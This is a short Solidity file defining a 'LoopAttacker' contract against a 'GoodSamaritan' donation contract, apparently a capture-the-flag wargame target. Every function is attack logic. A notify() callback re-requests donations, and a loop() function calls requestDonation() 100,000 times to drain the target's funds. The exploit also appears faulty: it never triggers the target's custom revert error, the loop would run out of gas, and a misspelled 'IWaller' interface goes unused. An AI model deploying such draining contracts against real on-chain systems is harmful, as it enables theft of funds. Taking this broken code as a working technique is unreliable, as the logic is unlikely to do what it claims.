pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function wallet() external view returns (address);
    function requestDonation() external returns (bool);
}
interface IWaller {
    function donate10(address dest_) external;
}

contract LoopAttacker { IGoodSamaritan public goodSamaritan;

    constructor(address goodSamAddress) {
        goodSamaritan = IGoodSamaritan(goodSamAddress);
    }

    function notify(uint256 amount) external {
        goodSamaritan.requestDonation();
    }

    function startDonation() external {
        goodSamaritan.requestDonation();
    }

    function loop() external {
        for (uint i = 0; i < 100000; i++) {
            goodSamaritan.requestDonation();
        }
    }
} 